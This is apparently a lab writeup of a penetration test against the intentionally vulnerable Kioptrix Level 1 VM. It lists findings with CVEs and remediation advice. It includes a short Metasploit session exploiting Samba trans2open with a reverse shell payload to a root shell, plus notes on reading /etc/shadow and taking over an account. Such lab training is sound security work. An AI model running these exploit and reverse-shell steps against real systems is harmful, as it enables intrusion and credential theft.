# Kioptrix Level 1 — Full System Exploitation Writeup

Penetration test of the Kioptrix Level 1 boot2root VM, performed end-to-end: network scanning, service enumeration, vulnerability research, exploitation, and post-exploitation. Full methodology and evidence documented in the accompanying report.

**Result:** Unauthenticated remote root compromise via a critical Samba service vulnerability.

## Environment

- **Attacker:** Kali Linux (VirtualBox)
- **Target:** Kioptrix Level 1 — Red Hat Linux 7.2 ("Enigma"), kernel 2.4.7-10
- **Network:** Isolated host-only lab network (10.0.2.0/24)
- **Tools:** Netdiscover, Nmap, Nikto, smbclient, Metasploit Framework, Searchsploit

## Methodology

1. **Reconnaissance** — host discovery via Netdiscover, connectivity confirmed
2. **Enumeration** — full port/service scan (`nmap -A -p- -T4`), Nikto web assessment, SMB enumeration
3. **Vulnerability Analysis** — confirmed exact service versions via Metasploit's `smb_version` scanner, cross-referenced with Searchsploit
4. **Exploitation** — Metasploit's `exploit/linux/samba/trans2open` module against Samba 2.2.1a
5. **Post-Exploitation** — verified root access, reviewed system artifacts, demonstrated credential exposure and account takeover

## Key Findings

| Finding | CVE | Severity |
|---|---|---|
| Samba 2.2.1a `trans2open` remote buffer overflow → unauthenticated root RCE | CVE-2003-0201 | **Critical** |
| Apache mod_ssl 2.8.4 remote buffer overflow (OpenFuck/OpenFuckV2) | CVE-2002-0082 | **Critical** |
| SSHv1 protocol supported, outdated OpenSSH 2.9p2 | CVE-2001-0144 (+others) | High |
| SSLv2 supported with export-grade/weak ciphers | CVE-2016-0800 class | Medium |
| HTTP TRACE method enabled (Cross-Site Tracing) | — | Medium |
| Outdated, EOL Apache/OpenSSL stack | Multiple | Medium |
| `/etc/shadow` readable post-compromise, weak MD5-crypt hashes | — | High (impact) |

## Exploitation Summary

```
msf > use exploit/linux/samba/trans2open
msf > set RHOSTS 10.0.2.4
msf > set LHOST 10.0.2.15
msf > set payload payload/linux/x86/shell_reverse_tcp
msf > run

[*] Command shell session opened
$ whoami
root
```

The default staged payload failed due to SSL/negotiation interference; switching to the unstaged `shell_reverse_tcp` payload resolved this and produced a stable root shell.

## Post-Exploitation Impact

- Confirmed OS/kernel details (Red Hat 7.2, kernel 2.4.7-10 — over two decades unsupported)
- Reviewed local mail spool, which recorded prior connection attempts from the attacking host — a reminder that exploitation activity leaves forensic traces on the target
- Demonstrated account takeover via `passwd`
- Confirmed `/etc/shadow` exposure with legacy MD5-crypt password hashes for all local accounts

## Recommendations

- Patch or decommission legacy Samba/Apache/mod_ssl versions
- Disable SSHv1 and SSLv2; enforce modern TLS
- Disable HTTP TRACE, add missing security headers
- Restrict/disable anonymous SMB access
- Migrate to strong password hashing and enforce password policy
- Deploy network segmentation and IDS/SIEM monitoring (e.g. Suricata, Wazuh) for legacy systems

## Full Report

See [`Kioptrix_Level1_Pentest_Report.docx`](./Kioptrix_Level1_Pentest_Report.docx) for the complete report with full evidence, screenshots, and detailed findings.

---
*Educational/lab exercise performed in an isolated environment against an intentionally vulnerable VM. Not performed against any production or third-party system.*
